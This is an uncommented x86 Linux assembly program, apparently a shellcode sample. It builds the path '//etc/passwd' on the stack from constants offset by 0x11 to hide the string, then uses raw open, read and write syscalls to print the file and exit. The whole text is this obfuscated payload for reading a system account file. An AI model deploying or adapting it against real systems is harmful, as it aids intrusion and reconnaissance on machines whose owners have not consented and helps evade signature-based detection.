section .text
global _start

_start: 
xor    ecx,ecx
mul    ecx
mov    al,0x5
push   ecx
mov esi, 0x64777362	 
add esi, 0x11
mov dword [esp-4], esi
mov esi, 0x61702f52
add esi, 0x11
mov dword [esp-8], esi
mov esi, 0x74652f1e	 
add esi, 0x11
mov dword [esp-12], esi
sub esp, 0xc
mov    ebx,esp
int    0x80
xchg   ebx,eax
xchg   ecx,eax
mov    al,0x3
mov    dx,0xfff
inc    edx
int    0x80
xchg   edx,eax
xor    eax,eax
mov    al,0x4
mov    bl,0x1
int    0x80
xchg   ebx,eax
xor ebx,ebx
int    0x80
